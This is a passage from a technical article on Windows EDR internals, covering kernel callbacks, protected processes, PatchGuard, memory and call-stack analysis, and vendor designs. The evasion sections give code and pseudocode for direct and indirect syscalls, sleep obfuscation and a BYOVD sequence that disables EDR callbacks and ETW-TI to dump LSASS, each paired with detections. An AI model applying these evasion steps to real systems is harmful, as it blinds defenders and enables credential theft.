                                         KnownGood │ KnownBad │ Unknown
                                                       │
                                        [Other boot drivers load]
```

The ELAM driver provides a **policy database** embedded in a registry binary blob:
```
HKLM\SYSTEM\CurrentControlSet\Control\EarlyLaunch\
    AlternateErrorControl = ELAM_BOOT_DRIVER_CALLBACK_REGISTRY_ENTRY[]
```

Each `ELAM_BOOT_DRIVER_CALLBACK_REGISTRY_ENTRY` contains: `ImageHash`, `HashAlgorithmID`, `ImageThumbprint`, `CertificatePublisher`, `CertificateIssuer`, `Classification`.

**Requirements to become an ELAM vendor**: Apply to Microsoft, legal agreement, implement ELAM driver, pass test suite, receive special **ELAM Authenticode certificate** (distinct from WHQL).

### AM-PPL: Antimalware Protected Process Light

The Protected Process model creates process isolation enforced by the kernel's object manager:

```
Process Protection Levels (ascending strength):
  ┌───────────────────────────────────────────────────────┐
  │ PsProtectedSignerNone-None (unprotected)              │
  │ PsProtectedSignerAntimalware-Light (EDR sensor svc)   │ ← Most EDR services
  │ PsProtectedSignerLsa-Light (LSASS with Credential Guard)│
  │ PsProtectedSignerWindows-Light (Windows system svcs)  │
  │ PsProtectedSignerWinTcb-Light                         │
  │ PsProtectedSignerWindows-Full                         │
  │ PsProtectedSignerWinTcb-Full (most trusted)           │
  └───────────────────────────────────────────────────────┘
```

**Enforcement in kernel** (`ObpGrantAccess`):
- If target process has Protection level X, and calling process has level < X, kernel strips `PROCESS_VM_READ`, `PROCESS_VM_WRITE`, `PROCESS_TERMINATE`, `PROCESS_CREATE_THREAD` from the granted access
- `SeDebugPrivilege` does NOT bypass PPL enforcement
- Even `NT AUTHORITY\SYSTEM` (highest user privilege) cannot dump a PPL process

**EPROCESS Protection field:**
```c
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;  // PS_PROTECTED_TYPE (None=0, Light=1, Full=2)
            UCHAR Audit  : 1;
            UCHAR Signer : 4;  // PS_PROTECTED_SIGNER
        };
    };
} PS_PROTECTION;
// Located at EPROCESS + 0x87A (W11 22H2, varies by build)
```

**Dual benefit of AM-PPL:**
1. Protects the EDR service from termination/injection
2. Grants access to `Microsoft-Windows-Threat-Intelligence` ETW provider (checked in `EtwpCheckNotificationAccess`)

---

## 11. PatchGuard and Kernel Integrity Constraints

**Kernel Patch Protection (KPP)**, introduced in Windows XP x64, computes checksums of critical kernel structures and verifies them at **randomized intervals** (typically every 5–10 minutes, jittered). Mismatch triggers `KeBugCheckEx` with code `0x109` (`CRITICAL_STRUCTURE_CORRUPTION`).

### What PatchGuard Protects

```
Protected by PatchGuard:
  ├── SSDT (KeServiceDescriptorTable / KeServiceDescriptorTableShadow)
  ├── IDT (Interrupt Descriptor Table)
  ├── GDT (Global Descriptor Table)
  ├── MSRs (LSTAR, SYSENTER_EIP, etc.)
  ├── ntoskrnl.exe / hal.dll / ndis.sys code sections
  ├── Object type structures (_OBJECT_TYPE)
  └── Various critical kernel globals

NOT protected by PatchGuard (EDR callback arrays live here):
  ├── PspCreateProcessNotifyRoutine (callback pointers in NONPAGED pool)
  ├── PspCreateThreadNotifyRoutine
  ├── PspLoadImageNotifyRoutine
  ├── CallbackList in _OBJECT_TYPE (separate allocation, not code section)
  └── ETW provider registration structures (also NONPAGED pool)
```

**The fundamental consequence:**  
All x64 EDRs use **documented kernel callback APIs** rather than SSDT hooks. This is not a choice — it is a PatchGuard enforcement. Any SSDT hook on x64 will trigger a BSOD within minutes.

**PatchGuard on x86:** Non-existent. 32-bit Windows has no KPP. SSDT hooking works on x86 (but the ecosystem has moved to x64).

---

## 12. Memory Analysis and VAD Scanning

The **Virtual Address Descriptor (VAD)** tree is a red-black tree maintained per-process in the kernel, tracking all virtual address space commitments. EDRs use it as a ground truth for memory state.

### VAD Region Classification

```
VAD Entry
├── Type: MEM_IMAGE      → mapped from on-disk PE file
│                           Copy-on-write; kernel tracks backing file
├── Type: MEM_MAPPED     → file mapping (data, not PE)
└── Type: MEM_PRIVATE    → anonymous commit (heap, stack, shellcode)
    └── With PAGE_EXECUTE_* → HIGH SUSPICION
```

### Detection Signals from VAD Analysis

| Signal | Detection | Technique Detected |
|--------|-----------|-------------------|
| `MEM_PRIVATE + PAGE_EXECUTE` | Shellcode | Reflective injection, manual mapping |
| `MEM_IMAGE` page differing from disk | Module tampering | Process hollowing, module stomping |
| VAD `MEM_IMAGE` entry missing from `PEB.Ldr` | Hidden module | Reflective DLL, manual mapping |
| `PEB.Ldr` entry missing from VAD | Module unlinking | Rootkit-style DLL hiding |
| `RW→RX` protection transition | Shellcode staging | Classic shellcode prep |
| Section start address ≠ standard PE alignment | Manual mapping | Reflective DLL |

### The Copy-on-Write Integrity Check

When a process loads a DLL from disk, pages are initially shared (Copy-on-Write). If the EDR wants to verify module integrity:

```python
# Pseudocode: EDR memory integrity check
for region in VirtualQueryEx(process, all_regions):
    if region.type == MEM_IMAGE:
        disk_bytes = read_pe_section_from_disk(region.backing_file, region.offset)
        mem_bytes  = ReadProcessMemory(process, region.base, region.size)
        
        if disk_bytes != mem_bytes:
            # Found modification!
            # Could be: hooked code, process hollowing, stomping
            emit_alert("IMAGE_INTEGRITY_VIOLATION", region)
```

### ETW-TI-Triggered Memory Analysis (Elastic's RX-INT Engine)

Rather than periodic scanning, the RX-INT approach described in arxiv 2508.03879 is event-driven:

```
NtAllocateVirtualMemory called
         │
         ├── ETW-TI: THREATINT_ALLOCVM_LOCAL fires
         │
         ▼
EDR checks: Is this allocation in RX (executable) memory?
         │
    YES  │
         ▼
Take VAD snapshot (XXH64 hash of image sections)
         │
         ▼
PsSetCreateThreadNotifyRoutine fires when thread starts in region
         │
         ├── Thread start in MEM_PRIVATE → immediate memory dump + alert
         │
         └── Thread start in MEM_IMAGE → compare current VAD vs. snapshot
                   │
                   Modified? → alert on specific changed page
```

**Performance**: 0.46% CPU overhead, zero false positives reported in Chrome monitoring tests.

---

## 13. Call Stack Analysis and Validation

The call stack is one of the most powerful signals available to an EDR. Every syscall carries context about *who called it and how*.

### How EDR Captures Call Stacks

1. **ETW-TI events** include the thread's user-mode call stack at time of emission
2. **User-mode hooks** can capture `RtlCaptureStackBackTrace()` at hook site
3. **Kernel callbacks** can walk `Thread->TrapFrame` for user-mode return addresses

### What a Legitimate Call Stack Looks Like

```
NtAllocateVirtualMemory      ← syscall target
ntdll!NtAllocateVirtualMemory ← ntdll stub (legitimate)
ntdll!RtlHeapAlloc            ← heap manager
kernel32!HeapAlloc            ← Win32 wrapper
myapp!main+0x4A               ← application code
kernel32!BaseThreadInitThunk  ← standard thread wrapper
ntdll!RtlUserThreadStart      ← TEB thread startup
```

### What a Suspicious Call Stack Looks Like

```
NtAllocateVirtualMemory        ← syscall target
0x0000017F45AB1337             ← ??? (MEM_PRIVATE region)
0x0000017F45AB1290             ← ??? (MEM_PRIVATE region)
kernel32!BaseThreadInitThunk   ← (may be spoofed)
ntdll!RtlUserThreadStart       ← (may be spoofed)
```

**Anomaly**: Return addresses in private memory (`MEM_PRIVATE`) = unbacked shellcode is calling into ntdll. This is the **primary indicator** for direct syscalls and reflective injection.

### Call Stack Spoofing Techniques

**Synthetic Frame Spoofing (VulcanRaven):**
```
Attack thread:
  [shellcode at MEM_PRIVATE]

Fabricated stack:
  → pretend to return to: kernel32!BaseThreadInitThunk+0x14
  → pretend to return to: ntdll!RtlUserThreadStart+0x21
  → [actual return] to shellcode
```

Problem: The EDR can walk the stack using actual **unwind metadata** in PE headers. If `RBP` chains and `RUNTIME_FUNCTION` tables don't agree, the fabricated frame is detected.

**SilentMoonwalk (desynchronized unwind):**
- Uses ROP gadgets to construct a stack where the *unwind chain* follows legitimate frames
- But actual *control flow* diverges from the unwound path
- Works because most EDRs use only the "fast path" unwind (following RBP) not the "precise path" (following RUNTIME_FUNCTION entries)

**Detection counter:** Elastic's implementation validates unwind-info consistency against function prologues — a discrepancy between `RUNTIME_FUNCTION` entries and actual prologue bytes reveals ROP-based spoofing.

### The Kernel Trap Frame: Silicon-Level Root of Trust

When a thread transitions from ring 3 → ring 0 via `syscall`, the CPU saves the **full register state** to a `KTRAP_FRAME` structure on the kernel stack. This includes the *actual* `RIP` (instruction pointer) at the moment of the syscall.

```c
// Kernel can validate: is the user-mode RIP in a legitimate region?
KTRAP_FRAME *trapFrame = Thread->TrapFrame;
ULONG_PTR rip = trapFrame->Rip;

// Check if RIP points into ntdll.dll text section
// If not → direct syscall detected
if (!IsInImageRange(rip, L"ntdll.dll")) {
    EmitDirectSyscallAlert(Thread);
}
```

This is **not spoofable in user mode** because the trap frame is written by CPU hardware before any user code can modify it.

---

## 14. Real-World EDR Implementations

### 14.1 CrowdStrike Falcon

**Kernel Component:** `CSAgent.sys`
- ELAM-enabled boot driver
- KMDF-based architecture
- File system filter driver registration (FSFilter Anti-Virus altitude range)

**Channel Files:** Encrypted behavioral protection submodules updated multiple times daily. The famous July 2024 outage was caused by a malformed channel file (`291`) that triggered an out-of-bounds memory read in CSAgent.sys.

**Kernel APIs Used:**
- Filter Manager (minifilter)
- Registry filter callbacks  
- Process/thread/image notification callbacks
- Image signature verification (`SeGetImageSigFlags`)
- Named pipe filtering
- Kernel Mode File Copy (W11 22H2+)

**ETW:** "Secure ETW" + AMSI integration + ETW-TI (Anniversary Update+)

**HVCI Compatible:** Yes. Certified to run under Hypervisor-Protected Code Integrity.

### 14.2 Microsoft Defender for Endpoint

**Architecture overview:**

```
┌──────────────────────────────────────────────────────────────┐
│ WdFilter.sys (Minifilter, FSFilter Anti-Virus altitude)      │
│   ├── 4 communication ports                                  │
│   ├── Process/Thread/Image callbacks                         │
│   ├── ObRegisterCallbacks (Process + Desktop objects)        │
│   ├── CmRegisterCallbackEx (Registry)                        │
│   └── PoRegisterPowerSettingCallback                         │
│                                                              │
│ WdNisDrv.sys (WFP Callout Driver)                           │
│   ├── ALE_FLOW_ESTABLISHED_V4/V6                            │
│   ├── STREAM_V4/V6                                          │
│   └── DATAGRAM_DATA_V4/V6                                   │
│                                                              │
│ WdBoot.sys (ELAM Driver)                                    │
│   └── Boot driver classification                             │
└──────────────────────────────────────────────────────────────┘
              │ (Bond-serialized, base64, HTTPS)
              ▼
     MDE Cloud Backend (Microsoft 365 Defender portal)
```

**ETW Subscriptions:** ~65 of ~111 identified providers  
**Detection engine features:**
- Token integrity verification
- PEB inconsistency detection
- Doppelgänging/Ghosting/Herpaderping detection via `FILE_OBJECT` flags in process creation callback
- Bond framework for telemetry serialization

### 14.3 SentinelOne

- Kernel access limited to visibility and anti-tamper (no deep kernel hooks)
- Remote APC execution monitoring
- RPC call re-attribution (identifies original caller through system service chains)
- **Cross-platform:** Linux/K8s uses pure user-space monitoring; macOS uses Apple Endpoint Security Framework (kext-free)
- **SKREAM:** Published framework for kernel exploit mitigations

### 14.4 Elastic Security

**Behavioral Detection Rules (v8.11, 35+ rules):**

```
direct_syscall              → RIP at syscall from MEM_PRIVATE
module_stomping             → image backed pages differ from disk
amsi_patch                  → AmsiScanBuffer memory differs from disk
wldp_patch                  → WldpQueryDynamicCodeTrust patch
etw_patch                   → EtwEventWrite memory differs from disk
remote_thread_shellcode     → thread created in MEM_PRIVATE
process_injection_via_apc   → cross-process APC to executable private region
image_rop                   → return address in hooked/patched image
cross_process_vm_read       → unexpected ReadProcessMemory patterns
call_stack_mismatch         → unwind chain / RBP chain disagreement
```

**Behavioral Flags per API Event (22 flags):**
`direct_syscall`, `cross_process`, `shellcode`, `image_hooked`, `image_rop`, `allocation_private`, `allocation_image`, `abnormal_callstack`, `call_stack_unusual_module`, `call_stack_final_frame`, `call_stack_rop_chain`, ... etc.

The Elastic approach is particularly sophisticated: it **fingerprints events** (hashes key attributes) and only emits **unique events** per process session, dramatically reducing telemetry volume without missing novel behavior patterns.

---

## 15. Evasion Techniques and EDR Counter-Measures

This section analyzes the offense-defense dynamic from a research perspective. Understanding evasion is essential for building effective detections.

### 15.1 Direct Syscalls

**The Problem EDRs Create:** By hooking `ntdll!Nt*` stubs, EDRs intercept calls at the user-mode layer. Direct syscalls bypass the hook by calling `syscall` directly.

**Hell's Gate (Original):**
```c
// Read SSN from ntdll stub
DWORD GetSyscallNumber(const char *funcName) {
    BYTE *stub = GetNtdllFunctionAddress(funcName);
    // Pattern: 4C 8B D1 (mov r10,rcx), B8 XX 00 00 00 (mov eax, SSN)
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
        stub[3] == 0xB8) {
        return *(DWORD*)(stub + 4);
    }
    return -1; // Hooked — stub starts with JMP, SSN overwritten
}
```

**Halo's Gate (When stub is hooked):**
```c
// SSNs are sequential by export address order
// If stub N is hooked, check stub N±1 and offset
int FindSSNFromNeighbor(BYTE *hookedStub) {
    // Check next function in export table
    BYTE *next = hookedStub + functionSize;
    if (IsNotHooked(next)) {
        return ExtractSSN(next) - 1; // SSN is one less
    }
    BYTE *prev = hookedStub - functionSize;
    if (IsNotHooked(prev)) {
        return ExtractSSN(prev) + 1;
    }
    return -1; // Both neighbors hooked → Tartarus' Gate
}
```

**SysWhispers2 / FreshyCalls (Export-sorted):**
```c
// Sort all Nt* exports by address → lowest address = SSN 0
// SSN is determined by position in sorted list, not stub bytes
// IMMUNE to inline patching because never reads stub bytes
NtFunctions = SortByAddress(GetAllNtExports());
SSN_NtAllocateVirtualMemory = IndexOf(NtFunctions, "NtAllocateVirtualMemory");
```

**Indirect Syscalls (Stack-walk resistant):**
```c
// Find 'syscall; ret' (0F 05 C3) gadget WITHIN ntdll
BYTE *gadget = FindBytesInNtdll("\x0F\x05\xC3");
// Jump to gadget instead of executing inline syscall
// Return address points INTO ntdll → callstack looks legitimate
```

**EDR Counter-Measures for Syscall Detection:**

```
1. Kernel Trap Frame Check (foolproof):
   When ring-3→ring-0 transition occurs, CPU writes actual RIP to TrapFrame
   Kernel driver checks: is TrapFrame.Rip within ntdll.dll range?
   NO → Direct syscall detected (cannot be spoofed)

2. Instrumentation Callback (Nirvana):
   NtSetInformationProcess(handle, 0x28, &callback, size)
   Stored in KPROCESS.InstrumentationCallback (offset 0x3d8)
   Fires on EVERY user-mode return from syscall
   Validates: is the RIP we're returning to within ntdll/win32u?
   
3. ETW-TI Callstack Correlation:
   THREATINT events include full callstack
   Elastic checks: does any frame in callstack resolve to MEM_PRIVATE?
   YES → flag as direct_syscall
```

### 15.2 Sleep Obfuscation

**The Problem:** EDR memory scanners will find shellcode/beacon in memory during sleep periods.

**Solution:** Encrypt memory during sleep, appear as non-executable data.

```
Ekko technique timeline:
T=0: Create timer queue with 3 timers:
     Timer1 (0ms delay): RtlEncryptMemory(beacon_region)
     Timer2 (1ms delay): NtProtectVirtualMemory(PAGE_NOACCESS)
     Timer3 (sleep_ms delay): NtProtectVirtualMemory(PAGE_EXECUTE_READ)
                               RtlDecryptMemory(beacon_region)
                               NtContinue(original_context)
     Then: WaitForSingleObject(event, INFINITE)

T=sleep: Timer3 fires → decrypt + restore → resume execution

During sleep: Memory shows as PAGE_NOACCESS, non-executable, encrypted
EDR scanner: sees non-executable data → no shellcode signature match
```

**Variants:**
| Tool | Mechanism | Detection Difficulty |
|------|-----------|---------------------|
| Ekko | Timer queues + RtlEncrypt | Medium (PROTECTVM patterns) |
| FOLIAGE | APC chain | Medium |
| Cronos | PAGE_NOACCESS toggle | High |
| DreamWalkers | Sleep + callstack spoof + ghost-loading | Very High |

**EDR Counter:** ETW-TI `THREATINT_PROTECTVM_LOCAL` frequency analysis. Legitimate JIT compilers change protections, but the *pattern* of `RW→NoAccess→RX` at fixed intervals is anomalous.

### 15.3 Process Injection Evolution

```
Classic (Detected trivially):
VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
→ Triggers: ObRegisterCallbacks (cross-process handle), 
            PsSetCreateThreadNotifyRoutine, ETW-TI ALLOCVM/WRITEVM/RESUME

APC Injection:
QueueUserAPC → existing thread in alertable wait
→ Avoids: Thread creation callback
→ Triggers: ETW-TI QUEUEUSERAPC_REMOTE (W10 1903+)

Process Hollowing:
CreateProcess(SUSPENDED) → NtUnmapViewOfSection → VirtualAllocEx(RWX) →
WriteProcessMemory → SetThreadContext → ResumeThread
→ Triggers: PEB inconsistency (MEM_PRIVATE where image should be)
           ETW-TI: ALLOCVM_REMOTE + WRITEVM_REMOTE + SETTHREADCONTEXT

Process Doppelgänging (2017):
NtCreateTransaction → NtCreateFile(transacted) → NtWriteFile(malicious) →
NtCreateSection(from transacted file) → NtRollbackTransaction
→ Tricks: No committed file to scan
→ Detected by: MmDoesFileHaveUserWritableReferences(), GetMappedFileNameW() failure

Process Ghosting (2021):
CreateFile(DELETE_ON_CLOSE) → FILE_DISPOSITION_INFO(delete pending) →
NtCreateSection(executable from open handle) → CloseFile (deletion proceeds)
→ Detected by: FILE_OBJECT delete-on-close flag in process creation callback

Module Stomping:
LoadLibrary(legit.dll) → VirtualProtect(RW) → 
memcpy(payload) → VirtualProtect(RX)
→ Triggers: ETW-TI PROTECTVM_LOCAL
→ Detects: in-memory ≠ on-disk comparison
```

---

## 16. BYOVD: The Nuclear Option

**Bring Your Own Vulnerable Driver** is the current gold standard for disabling EDRs. The attacker loads a legitimately-signed driver with a kernel memory corruption vulnerability, uses it to achieve arbitrary read/write in kernel memory, then surgically removes EDR visibility.

### The BYOVD Kill Chain (EDRSandblast Approach)

```
Step 1: Load vulnerable driver
        LoadDriver("RTCore64.sys")  // MSI Afterburner, CVE-2019-16098
        LoadDriver("gdrv.sys")      // Gigabyte, arbitrary R/W
        LoadDriver("DBUtil_2_3.sys") // Dell, arbitrary R/W

Step 2: Resolve kernel base
        EnumDeviceDrivers() → find ntoskrnl.exe base address

Step 3: Compute structure offsets
        Download PDB for current ntoskrnl.exe build
        Extract: PspCreateProcessNotifyRoutine RVA,
                 PspCreateThreadNotifyRoutine RVA,
                 PspLoadImageNotifyRoutine RVA,
                 EtwThreatIntProvRegHandle RVA,
                 EPROCESS.Protection offset,
                 OB_CALLBACK_ENTRY layout

Step 4: Remove process callbacks
        for entry in PspCreateProcessNotifyRoutine[0..63]:
            ptr = ReadKernel8(ntoskrnl + PspCPNR_offset + i*8)
            ptr = ptr & ~0xF  // clear flag bits
            func = ReadKernel8(ptr + EX_CALLBACK_FUNC_OFFSET)
            if func belongs to EDR_driver:
                WriteKernel8(ntoskrnl + PspCPNR_offset + i*8, 0)
                KfDecrement(ptr + RefCount)  // avoid leak

Step 5: Disable object callbacks
        OB_TYPE = *PsProcessType
        CallbackList = OB_TYPE + CALLBACK_LIST_OFFSET
        for entry in CallbackList:
            entry.Enabled = 0  // disable without removing

Step 6: Disable minifilter callbacks
        Frame = FltGlobals.FirstFrame
        while Frame:
            Volume = Frame.FirstVolume
            while Volume:
                for callback_node in Volume.Callbacks.PreCreate:
                    if DriverBelongsToEDR(callback_node.Driver):
                        UnlinkNode(callback_node)

Step 7: Disable ETW-TI
        ProvInfo = EtwThreatIntProvRegHandle + PROV_ENABLE_INFO_OFFSET
        WriteKernel4(ProvInfo, 0x0)  // zero out IsEnabled flags

Step 8 (Optional): Elevate to PPL
        WriteKernel1(EPROCESS.Protection, PsProtectedSignerWinTcb-Light)
        → Own process now dominates LSASS protection level
        → Can call MiniDumpWriteDump on LSASS
```

### BYOVD Industrialization (2024-2025)

The threat landscape shifted from EDRSandblast-style targeted attacks to **industrialized BYOVD tooling**:

- **RansomHub** (2024): Used 2,500+ variants of TrueSight anti-rootkit driver across campaigns
- **Babuk** (2025): Abused legitimate SentinelOne installer package (BYOI — Bring Your Own Installer)
- **Reynolds ransomware** (2025): Embedded NsecSoft driver (CVE-2025-68947)
- **Lazarus (FudModule)**: Selective ETW-GUID disabling per provider — surgical, leaves most telemetry intact

### BYOVD Mitigations (2026 Status)

| Mitigation | Status | Effectiveness |
|-----------|--------|--------------|
| Microsoft Vulnerable Driver Blocklist | Default-on W11 22H2+ | High (but requires updates) |
| HVCI | Opt-in (W11 22H2+ default on modern hardware) | Very High |
| WDAC (Windows Defender Application Control) | Enterprise deployment | High |
| ASR Rule: Block vulnerable driver load | Available via MDE | Medium |
| Kernel-mode code signing enforcement | Default since W10 x64 | Medium (bypassed by BYOVD) |

**HVCI's effect on BYOVD:** With HVCI enabled, even if an attacker achieves arbitrary kernel write via a vulnerable driver, they **cannot write to executable kernel pages** (the hypervisor enforces W^X from VTL 1). This eliminates kernel code injection but does NOT prevent data-only attacks (zeroing callback pointers, modifying EPROCESS fields) — which is exactly what EDRSandblast does.

---

## 17. HVCI and VBS: The New Frontier

**Virtualization-Based Security (VBS)** creates a hardware-isolated environment using the CPU's hypervisor extensions (Intel VT-x / AMD-V):

```
Normal World (VTL 0)             Secure World (VTL 1)
┌─────────────────────┐          ┌──────────────────────┐
│  Normal Kernel      │ ◄──────► │  Secure Kernel (SK)  │
│  (ntoskrnl.exe)     │  VMCALL  │  (securekernel.exe)  │
│                     │          │                       │
│  Drivers, EDR,      │          │  Credential Guard     │
│  Applications       │          │  HVCI enforcement     │
│                     │          │  VSM secrets          │
└─────────────────────┘          └──────────────────────┘
         │                                │
         └────────────── HV ──────────────┘
                   (Hyper-V hypervisor)
                   Hardware Root of Trust
```

### HVCI Effects on EDR

**For EDR vendors:**
- Cannot use dynamically allocated RWX kernel pages (self-modifying driver code)
- Must use `ExAllocatePoolWithTag` for code pages, which HVCI marks non-executable until `MmMarkPhysicalMemoryAsGood` approves them
- Must be WHQL-certified with HVCI-compatible flag

**For BYOVD attackers:**
- Arbitrary kernel write primitive still works (can write to data pages)
- But CANNOT inject executable kernel shellcode (hypervisor blocks page permission change)
- Data-only BYOVD (zeroing callback pointers) still fully works under HVCI
- This is why EDRSandblast's approach remains relevant even on HVCI systems

### Kernel Control Flow Guard (kCFG)

Under HVCI, **Kernel Control Flow Guard** is automatically enabled:
- Every indirect call in kernel mode is validated against the CFG bitmap
- CFG bitmap maintained in VTL 1 (secure kernel) — cannot be modified from VTL 0
- Effect: Injected shellcode cannot redirect kernel execution through function pointers even with arbitrary write — the CFG check will fail

**However:** Callback *arrays* are legitimate function pointer tables. Zeroing them removes the callbacks entirely rather than redirecting them — this is not a control flow hijack and is not blocked by kCFG.

---

## 18. Hardware-Level Detection: Intel TDT

**Intel Threat Detection Technology (TDT)** represents a fundamentally new detection layer: below the operating system, below the hypervisor, at the silicon level.

### Architecture

```
Application Layer
     │
OS/VMM Layer (where traditional EDR lives)
     │
Intel TDT (Hardware PMU Layer)
     │
Silicon (CPU)
```

**Components:**
1. **PMU (Performance Monitoring Unit)**: Hardware counters tracking branch patterns, cache behavior, instruction mix
2. **AET (Advanced Exploit Detection)**: Detects ROP chains, exploit patterns in PMU telemetry
3. **Ransomware Detection**: PMU identifies high-entropy write patterns + rapid encryption behavioral signatures

### Integration with EDR Products

Intel TDT integrates with:
- Microsoft Defender for Endpoint
- CrowdStrike Falcon
- Check Point Harmony Endpoint
- ESET Endpoint Security

**Performance study results:**
- Detected **93% of top ransomware variants** from silicon sensor alone
- Boosted overall EDR efficacy by **24%** above software-only detection
- False positive rate: near-zero (hardware patterns are highly specific)

### Why TDT Matters for the Arms Race

Traditional evasion techniques operate at the software layer and are **completely invisible to PMU-based detection**:
- Direct syscalls still generate the same branch patterns
- Sleep obfuscation doesn't hide the encryption operations
- Process injection doesn't eliminate the shellcode's execution behavior

For ransomware detection specifically, no amount of code obfuscation hides the fundamental behavior: rapidly reading and writing files with high entropy. This is detectable at the PMU level regardless of what the code looks like.

---

## 19. The Detection Arms Race: A Timeline

```
Year | Offensive Innovation              | Defensive Response
─────┼───────────────────────────────────┼──────────────────────────────────
2014 │ Reflective DLL Loading            │ VAD-based MEM_PRIVATE scan
2015 │ Process Hollowing                 │ PEB vs VAD integrity check
2016 │ Hook removal (disk vs memory)     │ ETW-TI provider (Win10 AnnivUpd)
2017 │ Process Doppelgänging             │ MmDoesFileHaveUserWritableReferences
2018 │ Hell's Gate (dynamic SSN)         │ Nirvana instrumentation callbacks
2019 │ Halo's Gate, APC injection        │ ETW-TI QUEUEUSERAPC_REMOTE (1903)
2020 │ Indirect syscalls                 │ Trap frame RIP validation
2020 │ Call stack spoofing               │ ETW-TI callstack analysis
2021 │ Process Ghosting                  │ FILE_OBJECT delete-pending detection
2021 │ BYOVD industrialization           │ Vulnerable driver blocklist
2021 │ Sleep obfuscation (Ekko)          │ PROTECTVM frequency analysis
2022 │ VEH-based syscalls (FreshyCalls)  │ Export-sort detection heuristics
2022 │ ETW session disabling             │ ETW structure integrity monitoring
2022 │ SilentMoonwalk (unwind desync)    │ Precise unwind-vs-prologue validation
2023 │ Patchless AMSI via VEH            │ NtContinue debug register monitoring
2024 │ EDRSilencer WFP abuse             │ WFP audit events 5447+, callouts
2024 │ RansomHub 2500+ driver variants   │ Driver blocklist expansion (24H2)
2025 │ BYOI (installer abuse)            │ Installer integrity validation
2025 │ Lazarus ETW-GUID selective disable│ Per-GUID ETW health monitoring
2026 │ ???                               │ Intel TDT + HVCI mainstream adoption
```

---

## 20. Threat Modeling the EDR Itself

The most sophisticated perspective: treating the EDR as a **target for attack**, not just a defensive tool.

### EDR Attack Surface Map

```
┌─────────────────────────────────────────────────────────────┐
│                    EDR Attack Surface                        │
│                                                              │
│  Kernel Components              User-Mode Components         │
│  ┌──────────────────┐          ┌─────────────────────┐      │
│  │ Kernel Driver    │          │ Sensor Service       │      │
│  │ ├─ IOCTL handler │          │ ├─ RPC/named pipe    │      │
│  │ ├─ IRP handling  │          │ ├─ DLL injection     │      │
│  │ └─ Callback regs │          │ └─ Config storage    │      │
│  └──────────────────┘          └─────────────────────┘      │
│          │                              │                    │
│  ┌───────▼──────────┐          ┌───────▼─────────────┐      │
│  │ Minifilter       │          │ Cloud Transport      │      │
│  │ ├─ Pre-op handler│          │ ├─ TLS to cloud      │      │
│  │ └─ Port handler  │          │ └─ Auth tokens       │      │
│  └──────────────────┘          └─────────────────────┘      │
│                                                              │
│  Attack Vectors:                                             │
│  [A] Kernel driver logic bugs → privilege escalation         │
│  [B] IOCTL attack surface → LPE/BSOD                        │
│  [C] IRP handler parsing bugs → kernel memory corruption     │
│  [D] BYOVD → blind all kernel callbacks                      │
│  [E] WFP manipulation → block cloud telemetry upload         │
│  [F] Process termination (if not AM-PPL) → kill sensor       │
│  [G] DLL unhooking → remove user-mode visibility             │
│  [H] ETW provider disabling → blind ETW-TI                   │
└─────────────────────────────────────────────────────────────┘
```

### Defense Hierarchy: Ranking EDR Sensor Robustness

```
Most Robust (hardest to defeat) ▲
│
│  [1] ETW-TI Provider (kernel emission, AM-PPL protected)
│      → Defeat requires: BYOVD or kernel-mode access
│
│  [2] Kernel Callbacks (PsSet*, ObRegister*, CmRegister*)
│      → Defeat requires: BYOVD (callback array modification)
│
│  [3] Minifilter (fltmgr)
│      → Defeat requires: BYOVD (FLT_INSTANCE unlinking)
│
│  [4] WFP Callout
│      → Defeat requires: admin rights + WFP API abuse
│         (EDRSilencer style — detectable via audit events)
│
│  [5] AM-PPL Service Protection
│      → Defeat requires: BYOVD (EPROCESS protection level modify)
│         or kernel-mode primitive
│
│  [6] User-Mode Hooks (ntdll inline hooks)
│      → Defeat requires: admin rights + ntdll unhook (trivial)
│
│  [7] AMSI Provider
│      → Defeat requires: user rights + VEH/patch (medium)
│
Most Fragile (easiest to defeat) ▼
```

### The Fundamental Asymmetry

The attacker must defeat **all** layers. The defender wins by detecting at **any** layer.

This asymmetry favors the defender — except when BYOVD is in play, where a single vulnerable signed driver can blind all kernel-layer sensors simultaneously. This is why the **Vulnerable Driver Blocklist** and **HVCI** are existential mitigations for modern EDR architecture.

---

## Appendix A: Key Kernel Structures Reference

```c
// EPROCESS (partial, offsets approximate for W11 22H2)
typedef struct _EPROCESS {
    // +0x000: KPROCESS (embedded)
    // +0x3D8: InstrumentationCallback (Nirvana)
    // ...
    // +0x440: UniqueProcessId
    // +0x448: ActiveProcessLinks
    // ...
    // +0x520: PEB
    // ...
    // +0x87A: Protection (PS_PROTECTION)
    // +0x87C: SignatureLevel
    // +0x87D: SectionSignatureLevel
    // ...
    // +0x1F0: Flags3 (bits 24/25 = EnableRead/WriteVmLogging)
} EPROCESS;

// OB_CALLBACK_ENTRY (undocumented, reconstructed)
typedef struct _OB_CALLBACK_ENTRY {
    LIST_ENTRY                  CallbackList;
    OB_OPERATION                Operations;
    BOOLEAN                     Enabled;        // ← BYOVD target
    struct _OBJECT_TYPE         *ObjectType;
    POB_PRE_OPERATION_CALLBACK  PreOperation;
    POB_POST_OPERATION_CALLBACK PostOperation;
    PVOID                       RegistrationContext;
} OB_CALLBACK_ENTRY;

// EX_CALLBACK (used in PspCreateProcessNotifyRoutine array)
typedef struct _EX_CALLBACK_ROUTINE_BLOCK {
    EX_RUNDOWN_REF      RundownProtect;
    PEX_CALLBACK_FUNCTION Function;            // ← actual callback address
    PVOID               Context;
} EX_CALLBACK_ROUTINE_BLOCK;
// Array entry = (EX_CALLBACK_ROUTINE_BLOCK*)(array_entry & ~0xF)
```

---

## Appendix B: Detection Techniques Summary Table

| Technique | EDR Sensor | Evasion | Counter-Evasion |
|-----------|-----------|---------|----------------|
| CreateRemoteThread injection | Thread callback + ObCallback | APC injection | ETW-TI QUEUEUSERAPC |
| Process hollowing | PEB check + VAD | Process ghosting | FILE_OBJECT delete flag |
| Direct syscall | ETW-TI callstack, Nirvana | Indirect syscall | Trap frame RIP check |
| Hook removal | Periodic hash check | Module stomping | ETW-TI PROTECTVM |
| LSASS dump | ObRegisterCallbacks | Handle duplication | Pre-callback strips access |
| AMSI bypass (patch) | Memory scan | VEH hardware breakpoint | NtContinue debug reg check |
| ETW-TI disabling | Integrity monitor | Per-GUID flag clear | CmRegisterCallback (registry) |
| WFP block | Audit event 5447 | Sublayer weight override | Max-weight permit callout |
